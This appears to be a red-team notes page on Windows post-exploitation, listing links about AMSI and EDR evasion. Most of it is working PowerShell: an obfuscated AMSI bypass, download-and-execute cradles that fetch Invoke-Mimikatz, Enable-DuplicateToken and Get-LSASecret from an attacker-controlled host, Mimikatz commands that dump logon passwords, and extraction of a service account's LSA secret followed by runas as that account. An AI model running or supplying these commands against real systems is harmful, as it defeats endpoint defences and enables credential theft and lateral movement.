Disable Windows Defender downgrades the host's security controls and introduces new risks. What if we could continue with post-exploitation by evading endpoint security?

https://pre.empt.blog/2023/maelstrom-6-working-with-amsi-and-etw-for-red-and-blue
https://www.optiv.com/insights/source-zero/blog/endpoint-detection-and-response-how-hackers-have-evolved
https://www.mandiant.com/resources/blog/staying-hidden-on-the-endpoint-evading-detection-with-shellcode
http://www.labofapenetrationtester.com/2016/09/amsi.html
https://www.slideshare.net/nikhil_mittal/amsi-how-windows-10-plans-to-stop-scriptbased-attacks-and-how-well-it-does-it
https://twitter.com/mattifestation/status/735261176745988096
https://github.com/samratashok/nishang



Patch AMSI before executing the script
    $bu = $null;$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils';
    $assmbly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m));
    $field = $assmbly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static');
    $field.SetValue($bu,$true);
    Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.X.206:8000/exfil/Invoke-Mimikatz.ps1');


Run the MimiKatz PS script
    Invoke-Mimikatz -Command "privilege::debug token::elevate sekurlsa::logonpasswords"


Following script will ensure we have the correct permissions to gain access to LSASecrets
    Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.X.206:8000/exfil/Enable-DuplicateToken.ps1'); Enable-DuplicateToken


Script dumps the contents from LSASecrets
    Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.X.206:8000/exfil/Get-LSASecret.ps1');Get-LSASecret


Patch AMSI before executing the script
    $bu = $null;$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils';
    $assmbly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m));
    $field = $assmbly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static');
    $field.SetValue($bu,$true);
    Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.X.206:8000/exfil/Enable-DuplicateToken.ps1'); Enable-DuplicateToken
    Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.X.206:8000/exfil/Get-LSASecret.ps1'); Get-LSASecret | Select-Object -Property Account, Secret| where { $_.Account -like "plum\backupsvc" } |Format-list

net localgroup administrators
net group "local_administrators" /domain
runas /user:"plum\backupsvc" powershell.exe
